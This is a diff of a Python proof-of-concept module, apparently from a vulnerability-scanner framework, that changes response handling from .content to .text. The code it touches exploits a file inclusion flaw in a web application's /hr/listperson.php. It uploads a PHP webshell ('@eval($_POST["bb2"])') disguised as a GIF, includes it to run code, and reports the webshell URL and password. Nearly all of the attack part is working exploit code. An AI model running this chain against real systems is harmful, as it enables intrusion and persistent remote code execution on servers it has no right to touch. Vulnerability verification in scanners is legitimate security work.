@@ -51,7 +51,7 @@ class Poc(ABPoc):
             payload = 'FidTpl[list]=../images/default/default.js'
             file_path = "/hr/listperson.php?%s" % payload
             verify_url = self.target + file_path
-            html = requests.get(verify_url).content
+            html = requests.get(verify_url).text
             if 'var evt = (evt) ? evt : ((window.event) ? window.event : "");' in html:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -69,14 +69,14 @@ class Poc(ABPoc):
                 'test.gif', 'Gif89a <?php echo(md5("bb2"));@eval($_POST["bb2"]);', 'image/gif')}
             gif_data = {'action': 'upload'}
             upload_content = requests.post(
-                upload_file_url, files=gif_file, data=gif_data).content
+                upload_file_url, files=gif_file, data=gif_data).text
             pic_reg = re.compile(
                 r"""set_choooooooooooosed\\('\\d+','(.*)','.*'\\);""")
             pic_file = pic_reg.findall(upload_content)
             pic_file = urllib.parse.urlparse((pic_file[0])[:-4]).path
             file_path = "/hr/listperson.php?FidTpl[list]=../%s" % pic_file
             webshell = '%s%s' % (self.target, file_path)
-            page_content = requests.get(webshell).content
+            page_content = requests.get(webshell).text
             if '0c72305dbeb0ed430b79ec9fc5fe8505' in page_content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:webshell={webshell},post_password=bb2'.format(
                     target=self.target, name=self.vuln.name, webshell=webshell))
